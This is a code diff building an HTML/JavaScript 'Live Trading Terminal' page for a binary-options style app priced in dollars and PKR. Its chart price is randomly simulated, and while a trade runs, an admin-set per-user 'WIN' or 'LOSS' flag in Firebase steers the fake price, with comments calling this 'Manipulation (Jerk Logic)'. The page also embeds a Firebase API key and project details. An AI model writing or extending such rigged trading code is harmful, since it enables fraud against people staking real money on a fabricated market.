@@ -1,34 +1,92 @@
-<script>
-    let currentPrice = 45000.00;
-    let isTradeActive = false;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Live Trading Terminal</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; margin: 0; text-align: center; }
+        #chart { height: 250px; background: #161a1e; border-bottom: 2px solid #2b3139; position: relative; display: flex; align-items: center; justify-content: center; }
+        .price { font-size: 3rem; color: #02c076; font-family: monospace; }
+        .trade-line { position: absolute; width: 100%; border-top: 2px dashed #f0b90b; display: none; }
+        .controls { padding: 20px; }
+        select, input { width: 90%; padding: 12px; margin: 10px 0; background: #2b3139; color: white; border: 1px solid #474d57; border-radius: 5px; }
+        .btn-up { background: #02c076; width: 45%; padding: 15px; border: none; font-weight: bold; border-radius: 5px; }
+        .btn-down { background: #f6465d; width: 45%; padding: 15px; border: none; font-weight: bold; border-radius: 5px; }
+    </style>
+</head>
+<body>
 
-    // Simulation function jo price ko move karta hai
-    setInterval(() => {
-        const uid = auth.currentUser.uid;
-        db.ref('users/' + uid + '/control').once('value', s => {
-            const mode = s.val();
-            let change = (Math.random() - 0.5) * 10; // Normal movement
+    <div id="chart">
+        <div id="price-display" class="price">45230.50</div>
+        <div id="t-line" class="trade-line"></div>
+    </div>
 
-            if (isTradeActive) {
-                // AGAR ADMIN NE FORCE WIN DIYA HAI
-                if (mode === "WIN") {
-                    change = Math.abs(change) + 2; // Hamesha thoda upar jerk dega
-                } 
-                // AGAR ADMIN NE FORCE LOSS DIYA HAI
-                else if (mode === "LOSS") {
-                    change = -Math.abs(change) - 2; // Hamesha niche jerk dega
+    <div class="controls">
+        <h2 id="timer-display" style="color:#f0b90b; display:none;">01:00</h2>
+        <select id="asset">
+            <option>BTC/USDT</option><option>ETH/USDT</option><option>EUR/USD</option><option>GOLD</option>
+            </select>
+        <select id="duration">
+            <option value="60">1 Minute</option>
+            <option value="300">5 Minutes</option>
+            <option value="600">10 Minutes</option>
+            <option value="900">15 Minutes</option>
+        </select>
+        <input type="number" id="amt" placeholder="Amount ($1 / 300 PKR)">
+        <div style="display:flex; justify-content: space-around;">
+            <button class="btn-up" onclick="startTrade('UP')">CALL (UP)</button>
+            <button class="btn-down" onclick="startTrade('DOWN')">PUT (DOWN)</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const auth = firebase.auth();
+
+        let currentPrice = 45000;
+        let isActive = false;
+
+        // Price Animation + Manipulation (Jerk Logic)
+        setInterval(() => {
+            const uid = auth.currentUser?.uid;
+            db.ref('users/' + uid + '/control').once('value', s => {
+                let jerk = (Math.random() - 0.5) * 5;
+                if(isActive) {
+                    if(s.val() === "WIN") jerk = Math.abs(jerk) + 2; 
+                    if(s.val() === "LOSS") jerk = -Math.abs(jerk) - 2;
                 }
-            }
+                currentPrice += jerk;
+                document.getElementById('price-display').innerText = currentPrice.toFixed(2);
+            });
+        }, 1000);
 
-            currentPrice += change;
-            updateChartUI(currentPrice);
-        });
-    }, 1000);
+        function startTrade(dir) {
+            const amount = document.getElementById('amt').value;
+            if(amount < 1) return alert("Min trade $1 / 300 PKR");
 
-    function updateChartUI(price) {
-        const priceLabel = document.getElementById('price-line');
-        priceLabel.innerText = "$" + price.toFixed(2);
-        // Yahan aap chart ki candle height ko CSS se control kar sakte hain
-    }
-              </script>
-              
+            isActive = true;
+            document.getElementById('t-line').style.display = "block";
+            document.getElementById('timer-display').style.display = "block";
+            
+            let time = document.getElementById('duration').value;
+            let countdown = setInterval(() => {
+                time--;
+                let m = Math.floor(time/60); let s = time%60;
+                document.getElementById('timer-display').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                
+                if(time <= 0) {
+                    clearInterval(countdown);
+                    isActive = false;
+                    document.getElementById('t-line').style.display = "none";
+                    alert("Trade Finished! Result processed by Admin.");
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
